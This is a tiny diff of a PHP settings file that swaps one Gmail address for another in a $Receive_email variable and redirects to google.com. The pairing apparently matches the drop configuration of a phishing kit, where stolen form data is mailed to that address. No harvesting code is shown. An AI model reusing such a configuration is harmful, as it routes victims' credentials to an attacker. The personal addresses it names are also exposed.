@@ -1,4 +1,4 @@
 <?php 
-$Receive_email="chith.pt.vietsov.vn@gmail.com";
+$Receive_email="jefeinstalacionesmodernas@gmail.com";
 $redirect="https://www.google.com/";
 ?>
